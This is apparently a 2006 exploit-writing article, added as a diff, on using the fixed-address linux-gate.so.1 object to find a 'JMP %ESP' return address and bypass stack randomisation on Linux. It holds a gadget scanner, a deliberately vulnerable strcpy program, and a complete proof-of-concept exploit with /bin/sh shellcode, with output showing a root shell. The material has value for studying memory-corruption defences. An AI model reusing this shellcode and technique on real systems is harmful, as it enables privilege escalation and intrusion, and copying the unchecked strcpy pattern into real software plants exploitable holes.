@@ -1,0 +1,328 @@
+(originally published on NewOrder Newsletter, #13)
+
+---[ Exploiting with linux-gate.so.1 . by Izik  <izik@tty64.org> ]
+
+Introduction
+------------
+
+Recruiting linux-gate.so.1 to support a buffer overflow exploit might not 
+make a lot of sense at first. But by understanding the way linux-gate.so.1 
+is currently being implemented, both in it's origin and the code it may 
+contain, will hopefully shine a new light on it. This article explains 
+what
+linux-gate.so.1 is and how it can be useful for exploits out there to 
+overcome some protections, and make life a little easier in the insane 
+world of return addresses and targets.
+
+Synchronizing
+-------------
+
+The examples below have been tested on a Linux box with kernel 2.6.14 and 
+compiled using gcc 3.4.5
+
+What is linux-gate.so.1?
+------------------------
+
+linux-gate.so.1 doesn't sound so evil, just another dynamically loaded 
+library, right? Not quite. This is not a dynamically loaded library but a 
+dynamically shared object (DSO). It's life purpose is to speed up and 
+support system calls and signal/sigreturn for the kernel within the user 
+application. In particular it helps out handling a situation where a 
+system
+call accepts six parameters. This is when the EBP register has to be 
+overwritten and serve as the 6th parameter to the system call. Notice that
+this ties the usage and need of linux-gate.so.1 to only linux kernels that 
+are running under ia32 and ia32-64 architectures.
+
+There are two interesting facts about linux-gate.so.1, which make this DSO 
+a little more special, which are where this DSO comes from, and how it 
+gets
+loaded to do its job.
+
+Trying to look for the linux-gate.so.1 file would be to no avail. That is 
+because it is not a real file. Although it appears within the ldd output 
+with the rest of the real librariesm, there is no file that is called 
+linux-gate.so.1 on the filesystem. And in fact there should never be one. 
+Because the origin of this DSO is not a file but rather a piece of the 
+kernel. This DSO comes straight from the kernel.
+
+From the kernel's perspective, having this DSO with code that has such a 
+significant meaning, requires that it is loaded and mapped within every 
+process. That lead into having a patchy way to get it into the process 
+space. The result is that it's done mapping it, but it is doing so outside
+of the normal loop and as a result, the linux-gate.so.1 is getting mapped 
+at a fixed address range within every process.
+
+Let's put this theory to a test and activate the VA patch, which amongst 
+other things also randomize mmap():
+
+--- snip snip ---
+
+root@magicbox:~# echo 1 > /proc/sys/kernel/randomize_va_space
+root@magicbox:~# ldd /bin/ls ; ldd /bin/ls
+        linux-gate.so.1 =>  (0xffffe000)
+        librt.so.1 => /lib/tls/librt.so.1 (0xb7fce000)
+        libc.so.6 => /lib/tls/libc.so.6 (0xb7e9e000)
+        libpthread.so.0 => /lib/tls/libpthread.so.0 (0xb7e8c000)
+        /lib/ld-linux.so.2 (0xb7fe2000)
+        linux-gate.so.1 =>  (0xffffe000)
+        librt.so.1 => /lib/tls/librt.so.1 (0xb7ee5000)
+        libc.so.6 => /lib/tls/libc.so.6 (0xb7db5000)
+        libpthread.so.0 => /lib/tls/libpthread.so.0 (0xb7da3000)
+        /lib/ld-linux.so.2 (0xb7ef9000)
+root@magicbox:~#
+
+--- snip snip ---
+
+The patchy integration of linux-gate.so.1 into the process seems to be 
+patchy enough to skip over the VA patch effect. Notice how the ldd ouptut 
+shows that libc.so.6 and the rest of the real libraries map changes due to 
+the VA patch. But the linux-gate.so.1 mapping stays the same all this 
+time.
+Woopsie? ;-)
+
+But still, these features themselves are only making linux-gate.so.1 a 
+target for attacks. The real vulnerability, so to speak, in 
+linux-gate.so.1 
+is it's code. If you twist the code a bit, you can find some surprising 
+things in there.
+
+Going RET2ESP
+-------------
+
+Return to ESP is a useful method to replace return addresses by creating 
+return addresses from an already existing code. Code such as the 
+application .text section, or by any other executable mapped sections. The 
+idea is to have code that transfers the program control to the ESP 
+register. In this situation an exploit can use it as a return address 
+instead of an absolute return address to the shellcode.
+
+Two obvious instructions that cut it, are 'JMP %ESP' and 'CALL %ESP' which
+are ideal for exploits. As in most buffer overflow exploits, the shellcode 
+is on the stack. These instructions would jump or call it and get it 
+executed. Just as if it was a case of using an absolute stack address for 
+a
+return address.
+
+Not using an absolute stack address as a return address in the exploit 
+gives the chance to kick some stack protections, to name one - VA. As by 
+now, randomizing the stack addresses like the VA does, will have no effect 
+on the exploiting process. 
+
+However, the major disadvantage in using this method, is the need to have 
+a
+code that includes these instructions. A sane compiler won't generate 
+these 
+instructions so easily. But by twisting the code a little bit using 
+offsets, it is possible to find the byte sequences of these instructions 
+someplace else. 
+
+CPU instructions are after all just given byte sequences that have a 
+meaning for the CPU. The variety of bytes in a code, for instructions like 
+'MOV' and 'PUSH', just to name a few, give us the chance to find the 
+wanted
+byte sequences in them. Then by doing an offset jump into the beginning of 
+the sequence, will make the CPU react as if it was a regular attended 
+instruction. 
+
+Getting dirty
+-------------
+
+Having a goal in mind to find 'JMP %ESP' or 'CALL %ESP', and an 
+exceptional
+DSO to twist - It's time do dig in!
+
+--- snip snip ---
+
+/*
+ * got_jmpesp.c, scanning for JMP %ESP
+ * - izik@tty64.org
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main(int argc, char *argv[]) {
+	int i, jmps;
+	char *ptr = (char *) 0xffffe000;
+
+	jmps = 0;
+
+	for (i = 0; i < 4095; i++) {
+
+		if (ptr[i] == '\xff' && ptr[i+1] == '\xe4') {
+
+			printf("* 0x%08x : jmp *%%esp\n", ptr+i);
+			jmps++;
+		}
+	}
+
+	if (!jmps) {
+
+		printf("* No JMP %%ESP were found\n");
+	}
+
+	return 1;
+}
+
+--- snip snip ---
+
+The above code is a very simple byte sequence scanner. It scans the DSO 
+within a page range and starts from the address 0xffffe000. The goal of 
+the
+search is to find the sequence 'FFE4' which is equal to 'JMP %ESP'
+
+--- snip snip ---
+
+root@magicbox:/tmp# ./got_jmpesp
+* 0xffffe777 : jmp *%esp
+root@magicbox:/tmp#
+
+--- snip snip ---
+
+Wee, without much efford an address pops out. It should be noted that this 
+means, that there is a 50/50 chance of finding a vulnerability. Either 
+'JMP *%ESP' can be found, or not. The factors of finding a 'JMP %ESP' 
+['FFE4'] in a given linux-gate.so.1 that we have to consider, are mostly 
+the kernel version, the compiler and the flags that have been used to 
+compile the kernel. Which means that the same kernel versions with more or
+less standard flags and a standard compiler on a different machine will 
+potentially give the same address as the result.
+
+Should we get a positive result, it will continue to work, even if the the 
+machine would get rebooted for example. And every running process on the 
+machine will have this value, in that address. So an exploit that will 
+exploit a buffer overflow vulnerability can use it as a return address, 
+both for remote and local attacks. 
+
+Working methodologically
+------------------------
+
+It doesn't take much to implement a scanner functionality in an exploit. A 
+dummy vulnerability and exploit will be used to demonstrate this. The 
+scanner is only good for local exploits, but by gathering results from 
+scanning different kernel versions and different linux-gate.so.1's it is 
+possible to compile a list of return addresses which can be used within a 
+remote exploit. 
+
+--- snip snip ---
+
+/*
+ * va-vuln-poc.c, Dummy strcpy()/buffer overflow vulnerability
+ * - izik@tty64.org
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(int argc, char **argv) {
+	char buf[256];
+	strcpy(buf, argv[1]);
+	return 1;
+}
+
+--- snip snip ---
+
+This is a very simple 'n classical buffer overflow. Picking the absolute 
+return address approach. By debugging it the location of the shellcode on 
+the stack can be discovered, which then can be used as the return address. 
+But a combination of RET2ESP and linux-gate.so.1 is much easier and more 
+automated. 
+
+--- snip snip ---
+
+/*
+ * va-exploit-poc.c, Exploiting va-vuln-poc.c 
+ * under VA patch (Proof of Concept!)
+ * - izik@tty64.org
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+char shellcode[] = 
+	"\x6a\x0b"              // push $0xb 
+	"\x58"                  // pop %eax 
+	"\x99"                  // cltd 
+	"\x52"                  // push %edx 
+	"\x68\x2f\x2f\x73\x68"  // push $0x68732f2f 
+	"\x68\x2f\x62\x69\x6e"  // push $0x6e69622f 
+	"\x89\xe3"              // mov %esp,%ebx 
+	"\x52"                  // push %edx 
+	"\x53"                  // push %ebx 
+	"\x89\xe1"              // mov %esp,%ecx 
+	"\xcd\x80";             // int $0x80 
+
+unsigned long find_esp(void) {
+        int i;
+        char *ptr = (char *) 0xffffe000;
+
+        for (i = 0; i < 4095; i++) {
+
+                if (ptr[i] == '\xff' && ptr[i+1] == '\xe4') {
+			printf("* Found JMP %%ESP @ 0x%08x\n", ptr+i);
+			return (unsigned long) ptr+i;
+                }
+        }
+
+	return 0;
+}
+
+int main(int argc, char **argv) {
+	char evilbuf[295];
+	char *evilargs[] = { "./va-vuln-poc", evilbuf , NULL };
+	unsigned long retaddr;
+
+	retaddr = find_esp();
+
+	if (!retaddr) {
+		printf("* No JMP %%ESP in this kernel!\n");
+		return -1;
+	}
+
+	memset(evilbuf, 0x41, sizeof(evilbuf));
+
+	memcpy(evilbuf+268, &retaddr, sizeof(long));
+
+	memcpy(evilbuf+272, shellcode, sizeof(shellcode));
+
+	execve("./va-vuln-poc", evilargs, NULL);
+
+	return 1;
+}
+
+--- snip snip ---
+
+Doing so reveals the location of the shellcode on the stack, and it can 
+then be used as return address. 
+
+Prior to attacking, the exlpoit calls the 'find_esp()' function to scan the
+current linux-gate.so.1 and return an address if it found one. The address 
+will contain the 'JMP %ESP' instruction and be used as the return address. 
+Since this is a global test (per kernel) it can be safely assumed that if 
+the exploit finds it, it would apply on the target program.
+
+--- snip snip ---
+
+root@magicbox:/tmp# gcc -o va-vuln-poc va-vuln-poc.c
+root@magicbox:/tmp# gcc -o va-exploit-poc va-exploit-poc.c
+root@magicbox:/tmp# ./va-exploit-poc
+* Found JMP %ESP @ 0xffffe777
+sh-3.00#
+
+--- snip snip ---
+
+And that's all there is to it.
+
+References
+----------------
+
+What is linux-gate.so.1?
+http://www.trilithium.com/johan/2005/08/linux-gate/
+
+Linus Torvalds is a disgusting pig and proud of it.
+http://lkml.org/lkml/2002/12/18/218
+
+# milw0rm.com [2006-04-17]
